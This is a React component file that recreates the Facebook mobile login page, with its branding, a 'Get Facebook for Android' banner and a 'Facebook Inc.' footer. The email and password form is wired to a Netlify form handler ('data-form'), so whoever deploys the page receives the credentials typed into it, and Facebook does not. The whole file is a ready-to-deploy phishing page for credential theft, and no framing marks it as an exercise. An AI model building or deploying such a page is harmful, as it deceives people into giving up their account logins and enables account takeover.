import React, {useState} from "react";
import "./LoginPage.css";
const LoginPage = () =>{
    const [mail,setMail] = useState("");
    const [pass,setPass] = useState("");
    return(
        <>
          <div className="tophead">Get Facebook for Android and browse faster.</div>
          <h2 className="header">facebook</h2> 
          <form name="data-form" method="post" data-netlify="true" onSubmit="submit">
              <input type="hidden" name="form-name" value="data-form" />
              <div className="mail">
                  <input type="text" name="email" id="email" placeholder="Mobile number or email address" value={mail} onChange={(e)=>{setMail(e.target.value)}} ></input>
              </div>
              <div className="password">
                  <input type="password" name="password" id="pass" placeholder="Password" value={pass} onChange={(e)=>{setPass(e.target.value)}} ></input>
              </div>
              <input type="submit" value="Log In" id="btn" ></input>
          </form>
          <div className="fpass"> Forgotten password?</div>
          <div style={{color:"grey", marginTop:"10px"}} >_______________________    or   _______________________</div>
          <div className="newacc">
              Create New Account</div>
          <div style={{color:"gray",marginTop:"80px"}}>About . Help . More</div> 
          <div style={{color:"gray"}}>Facebook Inc.</div>  
        </>
    );
};
export default LoginPage;